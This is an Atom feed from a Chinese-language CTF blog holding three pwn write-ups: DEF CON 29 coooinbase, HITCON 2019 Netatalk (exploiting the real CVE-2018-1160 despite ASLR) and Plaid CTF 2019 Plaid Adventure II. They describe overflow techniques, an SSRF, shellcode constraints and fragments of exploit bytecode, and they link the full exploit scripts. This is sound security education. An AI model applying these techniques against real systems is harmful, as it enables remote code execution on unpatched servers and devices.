<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>ddaa's blog - ddaa</title><link href="https://ddaa.tw/" rel="alternate"></link><link href="https://ddaa.tw/feeds/ddaa.atom.xml" rel="self"></link><id>https://ddaa.tw/</id><updated>2021-05-04T15:19:00+08:00</updated><entry><title>DEF CON 29 CTF Quals Pwn 149 coooinbase</title><link href="https://ddaa.tw/defconctf_pwn_149_coooinbase.html" rel="alternate"></link><published>2021-05-04T15:19:00+08:00</published><updated>2021-05-04T15:19:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2021-05-04:/defconctf_pwn_149_coooinbase.html</id><summary type="html">&lt;p&gt;2020 一整年都沒發文 XD，去年只有打 DEF CON 初賽決賽而已，今年年初只打了 RealWorld CTF，現在比較少打 CTF，除了健康和體力不太能負荷，總覺得題目也沒有以前有趣了，大部分題目要花大量時間逆向，技術含量卻有限，常常辛苦逆向完或寫好工具，但解完這題之後就用不太上...不如把時間拿去挖 real world 的漏洞更有價值 QQ 這題在漏洞部分是比較簡單的題目，但利用這個漏洞需要發揮創意思考，如果沒有非預期的爛洞的話會是有趣的 pwn 題&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目連上後會是一個信用卡付款的 web 頁面，前端 post data 送到 ruby 寫的後端處理&lt;br&gt;
ruby 端會先檢查一下 card number 是否格式正確，然後將 post data 轉換成 &lt;strong&gt;bson&lt;/strong&gt; 格式後用 base64 編碼透過 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;2020 一整年都沒發文 XD，去年只有打 DEF CON 初賽決賽而已，今年年初只打了 RealWorld CTF，現在比較少打 CTF，除了健康和體力不太能負荷，總覺得題目也沒有以前有趣了，大部分題目要花大量時間逆向，技術含量卻有限，常常辛苦逆向完或寫好工具，但解完這題之後就用不太上...不如把時間拿去挖 real world 的漏洞更有價值 QQ 這題在漏洞部分是比較簡單的題目，但利用這個漏洞需要發揮創意思考，如果沒有非預期的爛洞的話會是有趣的 pwn 題&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目連上後會是一個信用卡付款的 web 頁面，前端 post data 送到 ruby 寫的後端處理&lt;br&gt;
ruby 端會先檢查一下 card number 是否格式正確，然後將 post data 轉換成 &lt;strong&gt;bson&lt;/strong&gt; 格式後用 base64 編碼透過 stdin 丟給 &lt;code&gt;x.sh&lt;/code&gt; 執行&lt;br&gt;
&lt;code&gt;x.sh&lt;/code&gt; 會跑 qemu arm64 kernel，kernel 再運行 userspase 的程式處理 base64 input，最後將 output 回傳給 web 顯示&lt;br&gt;
userspace 和 kernel 各有一把 flag，kernel 的部分是另一題 cooinbase-kernel，這篇 write-up 不會提到 kernel 部分   &lt;/p&gt;
&lt;p&gt;這題的 kernel 部分不是 Linux Kernel，syscall 是自己定義的，userspace 也不是 ELF format，因此丟進 ida pro 沒辦法直接認出來&lt;br&gt;
需要自己標出 entry 再讓 ida pro 去解，userspace 的程式如果先看 kernel 應該可以很輕易找出來，但沒看可以更輕易找出來，因為 entry 就在 0 而已 XD&lt;br&gt;
接著是逆向的部分，userspace 是一個很小的 binary 叫做 &lt;code&gt;run&lt;/code&gt;，沒有 library call，syscall 也跟正常 Linux Kernel 的不同，程式有自己包幾個常見 function，像是 &lt;code&gt;strcpy&lt;/code&gt;、&lt;code&gt;memcpy&lt;/code&gt; 之類的，有點像 IoT 上會跑的程式  &lt;/p&gt;
&lt;p&gt;經過一番逆向之後可以看出程式的行為是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;透過 getchar 的 syscall 跑 loop 讀 512 byte 進來再補 \0 做結尾&lt;/li&gt;
&lt;li&gt;將 input 做 base64 decode，得到 raw bson&lt;/li&gt;
&lt;li&gt;將 raw bson 進行初步處理成 bson object&lt;/li&gt;
&lt;li&gt;從 bson object 拿到 post data 中的 &lt;code&gt;CVC&lt;/code&gt;, &lt;code&gt;MON&lt;/code&gt;, &lt;code&gt;YR&lt;/code&gt;, &lt;code&gt;CC&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;其中 &lt;code&gt;CC&lt;/code&gt; 是透過 &lt;code&gt;bson_get_string&lt;/code&gt; 取出，其他的是透過 &lt;code&gt;bson_get_int&lt;/code&gt; 取出&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;依序印出 &lt;strong&gt;PROCESSED CC: &lt;/strong&gt;、&lt;strong&gt;$CC&lt;/strong&gt;、&lt;strong&gt;\n&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;程式的漏洞在 &lt;code&gt;bson_get_string&lt;/code&gt;，裡面會發生 stack overflow&lt;br&gt;
bson string 的格式是：&lt;code&gt;"\x02" + ename + "\x00" + p32(size) + data + "\x00"&lt;/code&gt;&lt;br&gt;
&lt;code&gt;bson_get_string&lt;/code&gt; 會先取得 size，再用類似 alloca 的行為將 stack 往上拉，然後用 &lt;code&gt;strcpy&lt;/code&gt; 將 data 複製到 buffer 上&lt;br&gt;
因為沒有檢查 size 和 data 的長度是否一致，因此再 strcpy 時會發生 overflow，可以蓋掉 ret 控制 $pc &lt;br&gt;
但有個問題是，bson 是由 web 端的 ruby 構造出來的，我們沒辦法直接構造出 size 和 data 不一致的 bson  &lt;/p&gt;
&lt;p&gt;嘗試解決這個問題時，發現送超長的 input 時 output 會多噴一次 &lt;strong&gt;PROCESSED CC:&lt;/strong&gt;&lt;br&gt;
原因是程式其實會一直重複執行直到 &lt;code&gt;x.sh&lt;/code&gt; 裡面的 &lt;code&gt;timeout 1&lt;/code&gt; 中止 qemu 才停止&lt;br&gt;
我們送的長度如果在 base64 編碼後超過 512 byte，超出的部分就會到程式下次執行才被處理&lt;br&gt;
所以我們可以在控制 card number 的長度，讓 card number 的後半段變成下次執行的 input，就可以用後半段構造任意 bson  &lt;/p&gt;
&lt;p&gt;由於 kernel 沒有實作 &lt;strong&gt;ASLR&lt;/strong&gt; 和 &lt;strong&gt;DEP&lt;/strong&gt; 的保護，因此接下來將 $pc 控到我們 input 的地方跑 shellcode 就可以 RCE 了&lt;br&gt;
...才怪，上面只是我天真的想法 = =&lt;br&gt;
要控 $pc 到 stack 上的時候發現 input 如果包含 &lt;code&gt;0x80&lt;/code&gt; 以上的字元就沒辦法順利餵 input&lt;br&gt;
追蹤了一陣發現是在餵給 binary 之前 ruby 會用 regex 做檢查 card number&lt;br&gt;
如果 input 包含 &lt;code&gt;0x80&lt;/code&gt; 以上的字元會發生 utf8 decode 的 exception，binary 從 input 拿到的只是 exception 的字串而已&lt;br&gt;
只要傳合法的 utf8 字串就可以了嗎 ? 但唯一能放 shellcode 的 buffer 只有 stack 上，會落在 &lt;strong&gt;0xf000 ~ 0x10000&lt;/strong&gt; 之間&lt;br&gt;
而 &lt;code&gt;0xf0&lt;/code&gt; ~ &lt;code&gt;0xff&lt;/code&gt; 不可能在 utf8 的結尾出現，也就是說在 string-based 的 overflow 中我們沒辦法把 ret 蓋成 stack 上的 address  &lt;/p&gt;
&lt;p&gt;我在這邊卡關了好一陣子沒想法，只好請求隊友的支援 QQ 大家努力一陣子之後，幾乎在同時間發現三個可行的做法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;透過 SSRF 構造任意的 bson
    web 端的 ruby 是將 post form 轉送給 &lt;code&gt;http://#{env['HTTP_HOST']}/gen-bson"&lt;/code&gt;，但 HTTP_HOST 是從 HTTP header 的 HOST 欄位可以控制，可以架一個 web server 直接在 /gen-bson 頁面回傳任意的 bson，連前面控制 card number 的長度都不需要 ... XD 因為不會過原本的 /gen-bson，也不會遇到 utf8 字元的問題，所以真的是超簡單蓋 ret 跳 stack 跑 shellcode 就結束了&lt;/li&gt;
&lt;li&gt;透過 alloca 將 &lt;code&gt;strcpy&lt;/code&gt; 的內容蓋掉原本 codebase&lt;ul&gt;
&lt;li&gt;前面有提到 0 是這個 binary 的 entry point，由於 bson string 的 size 是我們可以任意控制的，因此有機會將 alloca 後的 buffer 拉到 codebase 的位置，這樣程式下一次執行時跑到 codebase 時就會跑我們的 code&lt;/li&gt;
&lt;li&gt;這個思路沒有實際嘗試，我把改掉 size 之後就沒有好好的跑到 &lt;code&gt;bson_get_string&lt;/code&gt; 裡面，應該是弄壞了偽造的 bson 結構，要重新構造一下才有機會，另外 &lt;code&gt;strcpy&lt;/code&gt; 寫的 shellcode 要避開 null byte 和 utf8 char 的問題，不是很好利用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;透過 &lt;code&gt;bson_get_int&lt;/code&gt; 寫 4 byte shellcode&lt;ul&gt;
&lt;li&gt;&lt;code&gt;bson_get_int&lt;/code&gt; 可以讀 4 byte 到 x2 指到的位置上，而 overflow 完 x2 剛好是 bson 中 &lt;code&gt;CC&lt;/code&gt; 結構的大小 (= size + 11)，我們可以跳到原本程式拿出 &lt;code&gt;YR&lt;/code&gt; 的地方，將 YR 的值取出當成 4 byte 的 shellcode 到 &lt;code&gt;size + 11&lt;/code&gt; 的位置，下次 overflow 再跳到 &lt;code&gt;size + 11&lt;/code&gt; 跑 4 byte shellcode，跳到完整 shellcode 的位置&lt;/li&gt;
&lt;li&gt;由於 &lt;code&gt;bson_get_string&lt;/code&gt; 已經先 parse 了 size 錯誤的 CC，因此我們需要在 CC 內部構造一個假的 bson object 讓拿完 size 之後，讓繼續爬 YR 的時候不會壞掉，細節請參考 exploit&lt;/li&gt;
&lt;li&gt;size + 11 沒有對齊 4 byte，但不知道是 qemu 還是 kernel 沒有檢查要 alignment，所以直接跳過去就可以執行&lt;/li&gt;
&lt;li&gt;4 byte shellcode 和 full shellcode 都要避開 invalid utf8 char&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;比賽中是用 SSRF 拿到 flag，後續 kernel 題就可以寫一個超過長度的 read shellcode 來拿到 kernel flag&lt;br&gt;
賽後試了一下透過第三個思路也是可以達成目的，但 shellcode 就比較難寫一點，要閃掉 invalid utf8 char，kernel 的部分理論上也沒問題，但就懶得寫了 XD   &lt;/p&gt;
&lt;p&gt;最後講一下寫 utf8 的 shellcode：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;透過類似 &lt;code&gt;add w0, w0, $imm&lt;/code&gt; 的指令當成 &lt;code&gt;mov&lt;/code&gt; 來控制 reg&lt;ul&gt;
&lt;li&gt;建議不要用 x 系列的 reg 否則會出現 invalid char&lt;/li&gt;
&lt;li&gt;裡面只有 $imm 有機會出現 0x80 以上的 char，遇上時可以 add 多次來閃&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;svc 0&lt;/code&gt; 結尾會包含 0xd4，因此下一條要是 0x80 以上的 instruction&lt;ul&gt;
&lt;li&gt;可以從 &lt;a href="https://developer.arm.com/documentation/ddi0596/2021-03/Base-Instructions/B-cond--Branch-conditionally-?lang=en"&gt;arm developer&lt;/a&gt; 的文件中找隨便一條低位的 8 bit 可以任意控制、高位不包含 invalid char、而且不影響 shellcode 行為的指令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;beq 0x0030&lt;/code&gt; = &lt;code&gt;\x80\x01\x00\x54&lt;/code&gt; 可以滿足條件&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;exp: &lt;a href="https://ddaa.tw/exp/coooinbase.py"&gt;coooinbase.py&lt;/a&gt;&lt;/p&gt;</content><category term="DEF CON CTF"></category><category term="Stack Overflow"></category><category term="ARMv8"></category><category term="Shellcode"></category></entry><entry><title>HITCON CTF 2019 Pwn 371 Netatalk</title><link href="https://ddaa.tw/hitconctf_pwn_371_netatalk.html" rel="alternate"></link><published>2019-10-16T01:39:00+08:00</published><updated>2019-10-16T01:39:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2019-10-16:/hitconctf_pwn_371_netatalk.html</id><summary type="html">&lt;p&gt;其實不是第一年在 HITCON CTF 出題，由於有正職在身，沒有時間從頭設計題目，因此都會盡量從跟工作有關聯的方向設計題目，今年這題其實也是在去年工作時處理 Insident Response 時遇到的 case，但經過深入研究後，發現了這個 CVE 有原揭露者沒想到的 exploit 方式，是我到現在出題為止最滿意的一題，從迴響上來看也是最好的一題 XD&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Netatalk&lt;/strong&gt; 是一套實作蘋果系統上 AFP 協定的軟體，AFP 跟 Windows 上的 SMB 類似，是用於兩台不同電腦間需要傳輸檔案的一種 file transfer protocol，但後來隨著 Apple 也支援 SMB 後，AFP 的使用量相對減少很多，但由於用 AFP 傳輸檔案還是比 SMB 快速和簡便一些，因此還是有些人會搭配 Time Machine …&lt;/p&gt;</summary><content type="html">&lt;p&gt;其實不是第一年在 HITCON CTF 出題，由於有正職在身，沒有時間從頭設計題目，因此都會盡量從跟工作有關聯的方向設計題目，今年這題其實也是在去年工作時處理 Insident Response 時遇到的 case，但經過深入研究後，發現了這個 CVE 有原揭露者沒想到的 exploit 方式，是我到現在出題為止最滿意的一題，從迴響上來看也是最好的一題 XD&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Netatalk&lt;/strong&gt; 是一套實作蘋果系統上 AFP 協定的軟體，AFP 跟 Windows 上的 SMB 類似，是用於兩台不同電腦間需要傳輸檔案的一種 file transfer protocol，但後來隨著 Apple 也支援 SMB 後，AFP 的使用量相對減少很多，但由於用 AFP 傳輸檔案還是比 SMB 快速和簡便一些，因此還是有些人會搭配 Time Machine 之類的服務進行使用&lt;/p&gt;
&lt;p&gt;Netatalk 在去年的 12 月左右被爆出了一個 &lt;code&gt;Critical&lt;/code&gt; 級別的 unauth RCE 漏洞，但隨著細節公開之後，研究者表示自己嘗試後發現只能在 NAS 上進行利用，詳情可以參考 tenable 的 blog&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172"&gt;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;BTW，這篇 blog 有點標題殺人....XD 雖然這個問題在 18 年前就產生，但是在 2012 年 3.0.1 版發布之後，改動了 object 結構才變成一個 exploitable 的漏洞，在這之前應該只能造成程式邏輯錯誤而使檔案傳輸中斷&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="netatalk.png" src="https://ddaa.tw/images/hitconctf_2019_netatalk.png"&gt;&lt;/p&gt;
&lt;p&gt;只能在 NAS 上利用的原因是，現今 Linux distribution 的 compiler，預設編譯時都已經加入 &lt;code&gt;-pie&lt;/code&gt; 的參數，這導致如果是 ASLR enabled 的系統上，攻擊者沒辦法事先知道記憶體的 layout，也沒辦法如 blog 提到的利用方式去進行後續的任意位置寫入&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由於 PIE 保護會有一定幅度影響系統的效能，目前大多數的 NAS 廠商都沒有開啟&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此外，攻擊者原本提到的利用方式只能繞過 auth 後執行 AFP 的檔案操作，沒辦法做到真正意義上的 RCE，但我在 HITCON CMT 2019 的 &lt;a href="https://hackmd.io/@HITCON/rk9d0q6Nr#CVE-2018-1160-Netatalk"&gt;talk&lt;/a&gt; 上，提出了另外利用方式，可以在同樣的漏洞上做到真正意義上，透過 &lt;code&gt;execve&lt;/code&gt; 執行系統上的任意指令，達到真正意義上的 RCE&lt;/p&gt;
&lt;p&gt;當時在研究這個漏洞的同時，其實就有在質疑真的在 ASLR 開啟的情況下，真的是 unexploitable 的漏洞嗎 ? 那時候簡單看了一下，overflow 使用 &lt;code&gt;memcpy&lt;/code&gt;，可以做 heap 上的 partial write，可能是有機會利用的，但與當時的 talk 主題 NAS 無關，因此保留起來沒有說這件事情，藏招這次出題時再來好好研究 XD&lt;/p&gt;
&lt;p&gt;首先我的想法是：「既然可以做 heap 上的 partial overwrite，那只要把 data ptr 往回指，應該就能做 CTF 常見的 heap exploit 吧，尤其現在的環境都有 tcache 好玩，可能有機會在 malloc 時搞出 main_arena 然後做進一步的利用。」&lt;/p&gt;
&lt;p&gt;但環境跑起來發現原本在 NAS 上觀察的 heap exploit 不見了... XD 原本的 data ptr 被指到 mmap 分出來的區段上，沒辦法用 ptmalloc 的機制來搞事 QQ 會這樣的原因是因為 afp protocol 中有一項 &lt;code&gt;server quantum&lt;/code&gt; 的設定，這個值會影響到 &lt;code&gt;malloc&lt;/code&gt; 出來的 buffer 大小 ... 預設值是 0x100000 (1 mb)，所以會改用 mmap 得到的空間當成 buffer，沒辦法如預期的一樣在 heap 上搞事&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我之前測試的 NAS 上有為了效能特調過這個值，因此會使用 &lt;code&gt;brk&lt;/code&gt; 分配出的 heap 當做 buffer&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原本以為好像就真的不能用了 QQ 但意外觀察到每次 data ptr 指向的位置都是相同的，afpd 在處理 request 的時候是 fork 出一個 process，在收到 &lt;code&gt;exit&lt;/code&gt; 的 AFP command 或著 timeout 之前，這個 process 都會保留 session 等待 client 進行檔案傳輸，相信打 CTF pwn 的人都可以馬上聯想到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fork =&amp;gt; memory layout 不變 =&amp;gt; ASLR 是假 der&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;每次連上的 data ptr 不變，因此我們可以用 overflow byte-by-byte 的方式觀察程式是否 crash，來判斷說目前 data ptr 的位置是多少，再透過 mmap 與 library 的 offset 去推算其他 library 的位置，於是現在我們對漏洞的可以利用程度，從 &lt;code&gt;不知道能對哪裡做任意寫入&lt;/code&gt; 變成 &lt;code&gt;可以對 library 的 bss 和 data 段做任意寫入&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;但由於沒辦法利用此方式 leak 出 code 段的位置，因此還是沒辦法用我在 HITCON CMT 上提的方式做到 RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至此我們就有機會寫 &lt;code&gt;__malloc_hook&lt;/code&gt; 或 &lt;code&gt;__free_hook&lt;/code&gt; 之類的位置來控 RIP 了，但由於這個 exploit 的程式 afpd 本身就是透過 socket 連線，不像 CTF challenge 通常會 redirect I/O 到 socket 上，也就不能簡單的跳 one gadget 來拿 shell，必須自行 dup  I/O 到 socket 在拿 shell，因此我們需要能跑 shellcode 或做足夠長度的 ROP 才行&lt;/p&gt;
&lt;p&gt;這邊可以達成的方式很多，我的預期解法是 overwrite ld 上的 data 段，把 &lt;code&gt;dl_load_lock&lt;/code&gt;  和 &lt;code&gt;dl_rtld_lock_recursive&lt;/code&gt; 的值都寫掉，這樣就可以跳 &lt;code&gt;setcontext&lt;/code&gt; gadget 做 SROP&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;dl_rtld_lock_recursive&lt;/code&gt; 是一個 function ptr，&lt;code&gt;dl_load_lock&lt;/code&gt; 是一個 mutex&lt;/li&gt;
&lt;li&gt;程式離開時會在 dl-fini 呼叫 &lt;code&gt;__rtld_lock_lock_recursive(GL(dl_load_lock));&lt;/code&gt; 來 release 程式一些資源，像是 &lt;code&gt;dlopen&lt;/code&gt; 開啟過的 library&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但 afpd 在 SIGPIPE 時不會結束程式，還是會等到 timeout 才離開，原本會需要在下一次的 command 送 AFP protocol 的 exit 讓程式結束，才能觸發 control RIP，我原本打算留給大家來解決這個問題，但考慮到 bruteforce ASLR 時會造成許多 sessions，還是決定在 afp.conf 裡面將 timeout 改成 0 讓 afpd 立刻結束，避免題目炸裂 XD&lt;/p&gt;
&lt;p&gt;最後不得不提 Tea Deliverers 的做法，雖然繞了一些遠路，但卻也是 real world exploit 常遇到的狀況，這次的漏洞能任意寫才是少見的情況 XD&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;02:01 &amp;lt; riatre&amp;gt; zzoru: We overwrote GOT entry of memcpy in libatalk.so.18 with system&lt;br&gt;
02:02 &amp;lt; riatre&amp;gt; Then trigger that with a.... strange code path I'd say  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag: &lt;code&gt;hitcon{D1d_y0u_us3_an0ther_0d4y_to_g3t_f14g?}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/netatalk.py"&gt;netatalk.py&lt;/a&gt;&lt;/p&gt;</content><category term="HITCON CTF"></category><category term="Heap Overflow"></category></entry><entry><title>Plaid CTF 2019 Pwn 250 Plaid Adventure II</title><link href="https://ddaa.tw/plaidctf_pwn_250_plaid_adventure_ii.html" rel="alternate"></link><published>2019-04-16T03:05:00+08:00</published><updated>2019-04-16T03:05:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2019-04-16:/plaidctf_pwn_250_plaid_adventure_ii.html</id><summary type="html">&lt;p&gt;這題約結束前 10 分鐘跟 angelboy 一起寫完 exploit&lt;br&gt;
已經確認在 local 可以打, 結果 remote server 壞掉 = =&lt;br&gt;
不然應該有機會 AK 的...QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;跟去年 &lt;a href="https://ddaa.tw/plaidctf_reverse_200_plaid_adventure.html"&gt;Plaid Adventure&lt;/a&gt; 一樣是由 &lt;a href="http://inform7.com/"&gt;inform 7&lt;/a&gt; 寫成的互動式文字遊戲&lt;br&gt;
題目敘述說要讀取 &lt;code&gt;flag.glksave&lt;/code&gt;, 但沒辦法使用 &lt;code&gt;restore&lt;/code&gt; 這個指令&lt;br&gt;
目的還算滿明確, 要用題目中的漏洞想辦法繞開限制執行 &lt;code&gt;restore&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;Analysis&lt;/h2&gt;
&lt;p&gt;逆向的方式請參考去年的 write up, 逆完之後大致可以知道遊戲是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只有一個場景, 場景上只有 &lt;code&gt;machine&lt;/code&gt; 和 &lt;code&gt;blackboard&lt;/code&gt; 兩個物件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;look machine&lt;/code&gt; 可以從結果得知 &lt;code&gt;dial&lt;/code&gt;, &lt;code&gt;slider …&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;這題約結束前 10 分鐘跟 angelboy 一起寫完 exploit&lt;br&gt;
已經確認在 local 可以打, 結果 remote server 壞掉 = =&lt;br&gt;
不然應該有機會 AK 的...QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;跟去年 &lt;a href="https://ddaa.tw/plaidctf_reverse_200_plaid_adventure.html"&gt;Plaid Adventure&lt;/a&gt; 一樣是由 &lt;a href="http://inform7.com/"&gt;inform 7&lt;/a&gt; 寫成的互動式文字遊戲&lt;br&gt;
題目敘述說要讀取 &lt;code&gt;flag.glksave&lt;/code&gt;, 但沒辦法使用 &lt;code&gt;restore&lt;/code&gt; 這個指令&lt;br&gt;
目的還算滿明確, 要用題目中的漏洞想辦法繞開限制執行 &lt;code&gt;restore&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;Analysis&lt;/h2&gt;
&lt;p&gt;逆向的方式請參考去年的 write up, 逆完之後大致可以知道遊戲是:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只有一個場景, 場景上只有 &lt;code&gt;machine&lt;/code&gt; 和 &lt;code&gt;blackboard&lt;/code&gt; 兩個物件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;look machine&lt;/code&gt; 可以從結果得知 &lt;code&gt;dial&lt;/code&gt;, &lt;code&gt;slider&lt;/code&gt;, &lt;code&gt;button&lt;/code&gt; 三個物件&lt;ul&gt;
&lt;li&gt;&lt;code&gt;set dial to $flavor&lt;/code&gt; (&lt;code&gt;select $flavor&lt;/code&gt;) 可以選擇飲料的口味&lt;ul&gt;
&lt;li&gt;一共有 18 個口味: apple, apricot, blackberry, cherry, cranberry, cola, grape, guava, lemon, lime, orange, pickle, peach, pear, pineapple, raspberry, strawberry and watermelon&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set slider to $num&lt;/code&gt; (&lt;code&gt;set $num&lt;/code&gt;) 可以設定將 slider 設成 -2147483648 ~ 2147483647 之間的數字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;push button&lt;/code&gt; 會掉一瓶飲料出來, 飲料會印上 &lt;code&gt;$index:$slider&lt;/code&gt; 的 symbol&lt;ul&gt;
&lt;li&gt;背包最多只能擺 6 瓶飲料&lt;/li&gt;
&lt;li&gt;不能重複購買飲料&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;drink $flavor&lt;/code&gt; 可以把飲料喝掉, 喝完背包的空間會清出來&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pickle&lt;/code&gt; 因為太難喝沒辦法喝掉...XD&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;look blackboard&lt;/code&gt; 會印出以下內容:&lt;blockquote&gt;
&lt;p&gt;A blackboard. On it is written:&lt;br&gt;
The flag will be here after restoring!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(write|erase) blackboard&lt;/code&gt; 可以在 blackboard 上寫字或清除, 最多不能超過 35 個字&lt;/li&gt;
&lt;li&gt;&lt;code&gt;restore&lt;/code&gt;, &lt;code&gt;save&lt;/code&gt; 之類的系統指令都被禁用了&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solving&lt;/h2&gt;
&lt;p&gt;這題的困難點就是在逆向和找洞...&lt;br&gt;
經過一番波折後，發現這題的漏洞在 &lt;code&gt;pickle&lt;/code&gt; 雖然沒辦法喝掉&lt;br&gt;
但還是會將背包飲料的數量 - 1, 因此可以突破背包 6 瓶飲料的限制&lt;br&gt;
飲料在印 symbol 時會存在 &lt;code&gt;479074_soda_sliders&lt;/code&gt;&lt;br&gt;
超過 6 瓶會 out of bound write, 蓋到後面 &lt;code&gt;479098_soda_func&lt;/code&gt; 的內容&lt;br&gt;
而 &lt;code&gt;479098_soda_func&lt;/code&gt; 是一個 func ptr array ... XD  &lt;/p&gt;
&lt;p&gt;到這邊已經可以自由控 $pc 到任意位置&lt;br&gt;
很開心地想說跳 &lt;code&gt;restore&lt;/code&gt; 就可以結束了, 但發現可以跳 &lt;code&gt;save&lt;/code&gt; 卻不能跳 &lt;code&gt;restore&lt;/code&gt;&lt;br&gt;
因為...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ routine7331_restore local0 local4 ;
    @nop;
    @nop;
    @nop;
    ...
    return 1;
];
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;◢▆▅▄▃ 崩╰(〒皿〒)╯潰 ▃▄▅▆◣&lt;/p&gt;
&lt;p&gt;比對了 asm 確定是沒有其他的 &lt;code&gt;@restore&lt;/code&gt; 指令集可以使用&lt;br&gt;
接下來很明確必須自行寫入 shellcode, 並跳過去執行 (glulx vm 不存在 NX 保護)&lt;br&gt;
原本想透過黑板的 write 指令來寫 bytecode&lt;br&gt;
但發現 write 指令沒辦法讀 null byte&lt;br&gt;
而要將 shellcode 偽造成 routine 一定得包含 null byte... orz&lt;br&gt;
BTW, 如果直接跳到非 routine 開頭的位置, glulx 會直接發生 exception 終止程式  &lt;/p&gt;
&lt;p&gt;卡了一陣子才想到可以利用前面 &lt;code&gt;479074_soda_sliders&lt;/code&gt; 來放 shellcode&lt;br&gt;
&lt;code&gt;479074_soda_sliders&lt;/code&gt; 是一個 big endien 的 int 陣列&lt;br&gt;
只要重複 &lt;code&gt;set slider to $num&lt;/code&gt; 和 &lt;code&gt;push button&lt;/code&gt; 就可以寫入 shellcode  &lt;/p&gt;
&lt;p&gt;這邊原本想把去年題目的 restore bytecode 送過去&lt;br&gt;
但發現因為遊戲檔案格式和版本不同, 沒辦法直接參考&lt;br&gt;
花了一點時間弄出最新版的 &lt;code&gt;.ulx&lt;/code&gt; 檔案&lt;br&gt;
又發現完整的 restore 長度會超過可用的空間 = =&lt;br&gt;
最後透過 try and error 確定只需要留以下 asm 就可以達到 restore 的功能:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;@callfiii routine763 1 2 0 -&amp;gt; local4;
@callfiii routine589 local4 2 301 -&amp;gt; mem450124;
@restore mem450124 -&amp;gt; local0;
return -1;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;最後只要把超出背包的某瓶飲料 slider 設到放 shellcode 的位置&lt;br&gt;
執行 &lt;code&gt;drink $flavor&lt;/code&gt; 就可以觸發 restore, 輸入 &lt;code&gt;flag&lt;/code&gt; 讀取 &lt;code&gt;flag.glksave&lt;/code&gt;&lt;br&gt;
再回來看 blackboard 上的內容就有 flag 了  &lt;/p&gt;
&lt;p&gt;此時就很悲劇的發現 remote server 壞掉&lt;br&gt;
就此跟 AK 無緣 QQ  &lt;/p&gt;
&lt;p&gt;不過後來修好之後, 還發現有一點小問題&lt;br&gt;
remote 因為 terminal 不同的關係, 觸發 &lt;code&gt;restore&lt;/code&gt; 時 input buffer 是髒的&lt;br&gt;
不能直接輸入檔名, 要先送一些 &lt;code&gt;/b&lt;/code&gt; 清掉 buffer 之後&lt;br&gt;
